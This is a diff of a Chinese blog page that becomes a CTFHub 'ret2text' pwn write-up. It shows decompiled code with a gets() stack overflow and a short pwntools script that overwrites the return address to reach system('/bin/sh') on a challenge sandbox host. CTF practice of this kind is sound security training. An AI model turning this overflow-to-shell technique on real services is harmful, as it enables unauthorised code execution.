@@ -2,10 +2,9 @@
 <html>
 
 <head>
-    
-                <meta charset="utf-8" />
+    <meta charset="utf-8" />
 <title>
-    Friends | 「配枪朱丽叶 - 分部。」
+    「配枪朱丽叶 - 分部。」
 </title>
 <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
@@ -43,7 +42,6 @@
                                 })();
                             </script>
                             
-                    
 </head>
 
 <body>
@@ -158,34 +156,150 @@
                 <div class="container">
                     <article class="post-wrap">
                         <header class="post-header">
-                            <h1 class="post-title zh">
-                                &#x53CB;&#x94FE;
+                            <h1 class="post-title">
+                                [CTFhub]ret2text
                             </h1>
-                            <h1 class="post-title en">
-                                Friends
-                            </h1>
-                        </header>
-                        <div class="post-content">
                             
-                                
-                                    <div class="friend-box">
-                                        <img class="friend-avatar" src="http://www.shawroot.cc/wp-content/uploads/2020/10/unnamed-file-80x80.png">
-                                        <div class="flink-info">
-                                            <a href="https://shawroot.cc" target="_blank">
-                                                「配枪朱丽叶。」
-                                            </a>
-                                            <br />
-                                            原站
-                                        </div>
-                                    </div>
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        「配枪朱丽叶 - 分部。」
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2021-07-01</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">1.2
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">258</a></span>
                                     
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
+                                
+                            </span>
                                         
+                                </div>
+                                
+                        </header>
+                        
+                        <div class="post-content">
+                            <blockquote>
+<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+</blockquote>
+<p>checksec了一下，64位没开任何保护。<br>
+main函数内容如下：</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4; // [rsp+0h] [rbp-70h]
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  puts(&quot;Welcome to CTFHub ret2text.Input someting:&quot;);
+  gets(&amp;v4, 0LL);
+  puts(&quot;bye&quot;);
+  return 0;
+}
+</code></pre>
+<p>找到栈大小和返回地址后，看secure函数，内容如下：</p>
+<pre><code class="language-c">int secure()
+{
+  unsigned int v0; // eax
+  int result; // eax
+  int v2; // [rsp+8h] [rbp-8h]
+  int v3; // [rsp+Ch] [rbp-4h]
+
+  v0 = time(0LL);
+  srand(v0);
+  v3 = rand();
+  __isoc99_scanf((__int64)&amp;unk_4008C8, (__int64)&amp;v2);
+  result = v2;
+  if ( v3 == v2 )
+    result = system(&quot;/bin/sh&quot;);
+  return result;
+}
+</code></pre>
+<p><code>system(&quot;/bin/sh&quot;);</code>的内存地址位0x4007b8，写脚本：</p>
+<pre><code class="language-python">from pwn import *
+
+p = remote('challenge-93c6eb0adcd5b58f.sandbox.ctfhub.com',35615)
+payload = 'a'*0x70+'a'*0x08+p64(0x4007B8)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
                         </div>
+                        
+                                
+                                    
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>「配枪朱丽叶 - 分部。」</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://shawr00t.github.io/ctfhubret2text/">https://shawr00t.github.io/ctfhubret2text/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
+                                        
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/ctfhubret2text/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/ctfhubret2text/&sharesource=qzone&title=[CTFhub]ret2text&pics=https://shawr00t.github.io/images/avatar.png?v=1625104864216&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/ctfhubret2text/&sharesource=weibo&title=[CTFhub]ret2text + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1625104864216 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://shawr00t.github.io/HdcmhNKsB/">#
+                                                pwn
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/pwnablekrcollision/">
+                                                                                                    [pwnable.kr]collision
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
                     </article>
                 </div>
+                
+                                            
             </div>
-            
-                                        
+    </div>
+    </div>
     </div>
     
         <footer id="footer" class="footer">
@@ -239,6 +353,10 @@
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
                 
+        </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
